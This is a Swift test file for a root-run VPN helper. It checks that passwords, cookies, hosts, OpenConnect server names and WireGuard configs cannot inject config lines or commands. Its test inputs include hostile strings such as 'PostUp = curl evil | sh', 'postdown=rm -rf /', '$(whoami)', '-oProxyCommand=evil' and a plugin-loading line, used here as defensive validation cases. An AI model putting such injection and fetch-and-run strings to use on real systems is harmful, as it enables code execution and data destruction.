import Foundation
import Testing
@testable import PeonyCore

/// The helper runs as root on input anyone with the user's privileges can craft,
/// so these cover the ways a value could smuggle in extra config or commands.
struct HelperSafetyTests {
  @Test func `forti config renders validated fields`() throws {
    let request = HelperRequest.FortiRequest(
      host: "vpn.example.com", port: 8443, credential: .password(username: "alex", password: "p@ss word"),
      trustedCert: "0123456789ABCDEF:0123456789ABCDEF0123456789ABCDEF0123456789ABCDEF", realm: nil)
    #expect(try request.configFile() == """
      host = vpn.example.com
      port = 8443
      username = alex
      password = p@ss word
      trusted-cert = 0123456789abcdef0123456789abcdef0123456789abcdef0123456789abcdef

      """)
  }

  @Test(arguments: ["secret\npppd-plugin = /tmp/evil.so", "a\rb", "tab\there"])
  func `passwords can't inject config lines`(password: String) {
    let request = HelperRequest.FortiRequest(host: "vpn.example.com", port: 443, credential: .password(username: "u", password: password), trustedCert: nil, realm: nil)
    #expect(throws: Validation.Failure.self) { try request.configFile() }
  }

  @Test func `a cookie sign-in leaves credentials out of the config and argv`() throws {
    let request = HelperRequest.FortiRequest(host: "vpn.example.com", port: 443, credential: .cookie("abc123"), trustedCert: nil, realm: "corp")
    let config = try request.configFile()
    #expect(!config.contains("username"))
    #expect(!config.contains("password"))
    #expect(config == "host = vpn.example.com\nport = 443\nrealm = corp\n")
    let invocation = try request.invocation(configPath: "/var/run/peony/forti.conf")
    #expect(invocation.arguments.contains("--cookie-on-stdin"))
    #expect(!invocation.arguments.contains { $0.contains("abc123") })
    #expect(invocation.stdin == "SVPNCOOKIE=abc123")
  }

  @Test func `a password sign-in doesn't read a cookie from stdin`() throws {
    let request = HelperRequest.FortiRequest(host: "vpn.example.com", port: 443, credential: .password(username: "u", password: "p"), trustedCert: nil, realm: nil)
    let invocation = try request.invocation(configPath: "/x")
    #expect(invocation.arguments == ["-c", "/x"])
    #expect(invocation.stdin == nil)
  }

  @Test func `a real-sized cookie fits`() throws {
    let cookie = String(repeating: "aB3+/=", count: 400)
    let request = HelperRequest.FortiRequest(host: "vpn.example.com", port: 443, credential: .cookie(cookie), trustedCert: nil, realm: nil)
    #expect(try request.invocation(configPath: "/x").stdin == "SVPNCOOKIE=\(cookie)")
  }

  @Test(arguments: ["abc\nSVPNCOOKIE=evil", "a\rb", "", "a b", "a;b", String(repeating: "a", count: 4086)])
  func `cookies can't carry line breaks`(cookie: String) {
    let request = HelperRequest.FortiRequest(host: "vpn.example.com", port: 443, credential: .cookie(cookie), trustedCert: nil, realm: nil)
    #expect(throws: Validation.Failure.self) { try request.invocation(configPath: "/x") }
  }

  @Test func `forti requests round-trip through the helper's JSON`() throws {
    for credential in [HelperRequest.FortiRequest.Credential.cookie("abc"), .password(username: "u", password: "p")] {
      let request = HelperRequest.forti(.init(host: "vpn.example.com", port: 443, credential: credential, trustedCert: nil, realm: nil))
      #expect(try JSONDecoder().decode(HelperRequest.self, from: JSONEncoder().encode(request)) == request)
    }
  }

  @Test(arguments: ["", "-oProxyCommand=evil", "vpn example.com", "vpn.example.com;rm", "$(whoami)"])
  func `bad hosts are rejected`(host: String) {
    #expect(throws: Validation.Failure.self) { try Validation.host(host) }
  }

  @Test func `openconnect never puts the password in argv`() throws {
    let request = HelperRequest.OpenConnectRequest(server: "vpn.example.com", serverProtocol: .gp, username: "me", password: "hunter2", serverCert: nil)
    let arguments = try request.arguments()
    #expect(!arguments.contains { $0.contains("hunter2") })
    #expect(arguments.contains("--passwd-on-stdin"))
    #expect(arguments.last == "vpn.example.com")
  }

  @Test func `openconnect server can't become an option`() {
    let request = HelperRequest.OpenConnectRequest(server: "--script=/tmp/x", serverProtocol: .anyconnect, username: "me", password: "x", serverCert: nil)
    #expect(throws: Validation.Failure.self) { try request.arguments() }
  }

  @Test(arguments: ["PostUp = curl evil | sh", "postdown=rm -rf /", "  PreUp = x", "SaveConfig = true"])
  func `wireguard configs that run commands are refused`(line: String) {
    let config = "[Interface]\nPrivateKey = abc\n\(line)\n[Peer]\nPublicKey = def\n"
    #expect {
      try WireGuardConfig.validate(config)
    } throws: { error in
      if case .runsCommands = error as? WireGuardConfig.Problem { true } else { false }
    }
  }

  @Test func `a plain wireguard config passes`() throws {
    let config = "[Interface]\r\nPrivateKey = abc\r\nAddress = 10.0.0.2/32\r\n\r\n[Peer]\r\nPublicKey = def\r\nEndpoint = vpn.example.com:51820\r\n"
    #expect(try WireGuardConfig.validate(config).contains("Endpoint = vpn.example.com:51820"))
  }

  @Test(arguments: [("peony0", true), ("wg-work", true), ("0bad", false), ("Upper", false), ("way-too-long-interface", false), ("../x", false)])
  func `interface names`(name: String, valid: Bool) {
    #expect(((try? Validation.interfaceName(name)) != nil) == valid)
  }

  @Test func `requests round-trip as JSON`() throws {
    let request = HelperRequest.wireGuardDown(interfaceName: "peony0")
    let data = try JSONEncoder().encode(request)
    #expect(try JSONDecoder().decode(HelperRequest.self, from: data) == request)
  }
}

struct OpenConnectLogParserTests {
  @Test(arguments: ["Configured as 10.1.2.3, with SSL connected and DTLS in progress", "ESP session established with server"])
  func `tunnel up`(line: String) {
    #expect(OpenConnectLogParser().consume(line) == .tunnelUp)
  }

  @Test func `certificate pin suggestion`() {
    let line = "To trust this server in future, perhaps add this to your command line:\n    --servercert pin-sha256:xp3scfzy3rOgQEXnfPiYKrUk7D66a8b8O+gEXaMPleE="
    let last = line.components(separatedBy: "\n").last!
    #expect(OpenConnectLogParser().consume(last) == .certificateRejected(digest: "pin-sha256:xp3scfzy3rOgQEXnfPiYKrUk7D66a8b8O+gEXaMPleE="))
  }

  @Test func `login failure`() {
    #expect(OpenConnectLogParser().consume("Login failed.") == .authenticationFailed)
  }
}

struct ProbeTargetTests {
  @Test(arguments: [("gitlab.example.com", "gitlab.example.com", 443), ("10.0.0.5:22", "10.0.0.5", 22), (" db.internal:5432 ", "db.internal", 5432)])
  func `parses host and port`(text: String, host: String, port: Int) throws {
    let target = try #require(Probe.Target(text))
    #expect(target.host == host)
    #expect(Int(target.port) == port)
  }

  @Test func `empty is not a target`() {
    #expect(Probe.Target("  ") == nil)
  }
}
